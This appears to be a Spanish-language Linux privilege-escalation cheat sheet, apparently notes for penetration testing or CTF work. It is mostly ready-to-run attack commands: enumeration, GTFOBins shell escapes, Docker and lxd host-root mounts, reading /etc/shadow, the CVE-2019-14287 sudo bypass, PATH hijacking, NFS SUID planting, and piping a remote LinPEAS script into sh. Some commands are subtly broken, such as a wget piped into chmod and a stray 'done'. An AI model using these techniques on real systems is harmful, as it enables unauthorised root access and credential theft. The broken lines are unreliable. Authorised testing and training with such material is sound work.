# Sanitización de Shell

```
script /dev/null -c bash
## CTRL+Z
reset xterm
export TERM=xterm
export SHELL=bash
source /etc/skel/.bashrc
``` 

### [[penelope]]

# Reconocimiento
## Información del sistema y kernel
```bash

cat /etc/issue ## Identificador de la distribución del sistema operativo

(cat /proc/version || uname -a ) 2>/dev/null

cat /etc/os-release 2>/dev/null

sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]" ## Comprueba si la versión de `sudo` es vulnerable.
```


## Información de la red

```shell
ipconfig ## Muestra la configuración de red

ip a ## Muestra información detallada de todas las interfaces de red

netstat -tulpn ## Muestra sockets de escucha (`-l`) TCP/UDP (`-t`/`-u`), con números en lugar de nombres (`-n`) y el proceso/programa que los usa (`-p`). Requiere permisos de root para ver todos los procesos

arp -a ## Muestra la tabla ARP (Protocolo de resolución de direcciones) del sistema, que mapea direcciones IP a direcciones MAC en la red local.

ss -nltuwxp ## Info sobre puertos abiertos
```


## Usuarios y grupos

```shell
cat /etc/passwd ## Muestra el archivo de base de datos de usuarios del sistem

cat /etc/group ## Muestra el archivo de base de datos de grupos del sistema

whoami ## Usuario actual

id ## IDs del usuario actual (UID, GID y grupos)

sudo -l ## Comandos ejecutables con privilegios
```


## Procesos en ejecución

```shell
ps aux ## Muestra una instantánea de todos los procesos

ps -ef ## Muestra una lista completa de todos los procesos en formato estilo BSD

top ## Muestra una vista dinámica en tiempo real de los procesos del sistema
```


## Servicios y cron jobs

```shell
systemctl list-timers ## Lista todos los temporizadores del systemd

crontab -l ## Lista cronjobs (tareas programadas) del user actual

ls -la /etc/cron* ## Lista /etc/cron (cronjobs)

cat /etc/crontab ## Archivo de config principal de cron (jobs globales)
```


## Archivos con permisos SUID/SGID

```shell
find / -perm -u=s -type f 2>/dev/null
## Busca archivos con el bit SUID (Set User ID)

find / -perm -g=s -type f 2>/dev/null
## Busca archivos con el bit SGID (Set Group ID)
```


## Enumerar capabilities

```bash
getcap -r / 2>/dev/null
## Capabilities

capsh --print
## Más capabilities

cat /dir/dir/file | grep Cap
## Capabilites de un archivo concreto

grep Cap /proc/$PID/status
## Capabilites de un proceso por PID

find / -writable -type f 2>/dev/null
## Archivos editables por el usuario actual

find / -writable -type d 2>/dev/null
## Dirs editables

find / -type f -writable 2>/dev/null 
## Archivos editables

find / -type f -executable 2>/dev/null
## Archivos ejecutables

find / -group group
## Archivos owneados por group

```

# Locations
## Folders
```
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
## Weird
```sh
find /home -user root 2>/dev/null
#root owned files in /home folders

for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by other users in folders owned by me

find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by root, readable by me but not world readable

find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Files owned by me or world writable<div class="page-break" style="page-break-before: always;"></div>

for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
#Writable files by each group I belong to
```
# Variables de entorno
```sh
(env || set) 2>/dev/null 
```

# Path
```sh
echo $PATH
```

# Scripts
### Suid3num
```bash
wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py | chmod +x suid3num.py
```
### pspy64
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 && chmod +x pspy64 && ./pspy64
```
### Linpeas
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
 

# Protips
## SUID
### Este código añade el bit SUID al binario bash 
```bash
chmod u+s /bin/bash
```

## MySQL
### MySQL oneliner DB connection
```bash
mysql -u USERNAME -pPASSWORD -h HOSTNAME DATABASENAME 
```

## Groups
Pertenecer a ciertos grupos da vías directas a root.

### Disk
Acceso crudo a los dispositivos de bloque → leer/escribir cualquier fichero (incl. `/etc/shadow`).
```bash
df -h                                   # localizar el dispositivo de /
debugfs /dev/sda1                       # navegar el FS sin permisos
# dentro de debugfs:  cat /etc/shadow
```

### Docker
Montar el FS del host o lanzar un contenedor privilegiado = root.
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### lxd / lxc
```bash
# importar imagen y montar / del host
lxc init alpine r -c security.privileged=true
lxc config device add r disk source=/ path=/mnt/root recursive=true
lxc start r && lxc exec r /bin/sh
```

### Otros grupos peligrosos
| Grupo | Vía |
|-------|-----|
| `sudo` | `sudo -l` → ver qué se puede ejecutar como root |
| `wheel` | Equivalente a sudo en muchas distros |
| `adm` | Lectura de logs (`/var/log`) — info sensible |
| `shadow` | Lectura de `/etc/shadow` → crackear hashes |
| `video` | Captura de framebuffer (`/dev/fb0`) |

# Sudo

```bash
sudo -l                         # qué puedo ejecutar como root (¡lo primero!)
sudo -u#-1 /bin/bash            # CVE-2019-14287 (bypass de Runas)
```

| Caso | Explotación |
|------|-------------|
| `(ALL) NOPASSWD: /bin/X` | Buscar `X` en **GTFOBins** para escapar a shell |
| `env_keep+=LD_PRELOAD` | Cargar `.so` malicioso al ejecutar con sudo |
| `sudo` versión vulnerable | Baron Samedit `CVE-2021-3156` (heap overflow) |

# SUID / SGID + GTFOBins

Localizados con `find / -perm -4000 2>/dev/null`. Si el binario aparece en **GTFOBins**, escapar a shell con sus privilegios.

```bash
# Ejemplos clásicos (binario SUID-root)
find . -exec /bin/sh -p \; -quit
nmap --interactive                       # nmap antiguo: !sh
env /bin/sh -p
cp /etc/passwd /tmp; # binarios de copia/escritura → sobrescribir /etc/passwd
```

> El flag `-p` en `/bin/sh -p` evita que se descarten los privilegios (EUID).

# Capabilities

```bash
getcap -r / 2>/dev/null
```

| Capability | Explotación |
|------------|-------------|
| `cap_setuid+ep` | `./binario -c 'import os; os.setuid(0); os.system("/bin/sh")'` (python) |
| `cap_dac_read_search` | Leer cualquier fichero (p.ej. `/etc/shadow`) |
| `cap_dac_override` | Escribir cualquier fichero |

# Cron jobs

```bash
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
```
| Debilidad | Explotación |
|-----------|-------------|
| Script cron **escribible** ejecutado por root | Inyectar comando/reverse shell |
| Wildcard en `tar`/`rsync` (`*`) | **Wildcard injection** (`--checkpoint-action=exec=...`) |
| PATH relativo en el cron | Plantar binario malicioso en un dir escribible del PATH |

# PATH hijacking

Si un binario SUID llama a otro comando **sin ruta absoluta**:
```bash
cd /tmp; echo '/bin/bash -p' > comando; chmod +x comando
export PATH=/tmp:$PATH
/ruta/binario_suid           # ejecuta nuestro 'comando'
```

# NFS (no_root_squash)

Si un export tiene `no_root_squash`, un root remoto crea binarios SUID en el share.
```bash
showmount -e VICTIMA
mount -t nfs VICTIMA:/share /mnt
# desde root en el atacante:
cp /bin/bash /mnt/sh; chmod +s /mnt/sh
# en la víctima:  /share/sh -p
```

# Kernel exploits

```bash
uname -r                        # versión del kernel
searchsploit linux kernel <ver>
```
| Exploit | Afecta |
|---------|--------|
| DirtyCow `CVE-2016-5195` | Kernels < 4.8.3 (escritura COW) |
| DirtyPipe `CVE-2022-0847` | Kernels 5.8 – 5.16 |
| PwnKit `CVE-2021-4034` | `pkexec` (polkit) — casi universal |

> Los exploits de kernel son ruidosos y pueden tumbar la máquina. Última opción tras agotar misconfiguraciones.

# Recursos
### [GTFOBins](https://gtfobins.github.io/) · [[penelope]]
### [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
### [PEASS-ng (LinPEAS)](https://github.com/peass-ng/PEASS-ng)
### [g0tmi1k — Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
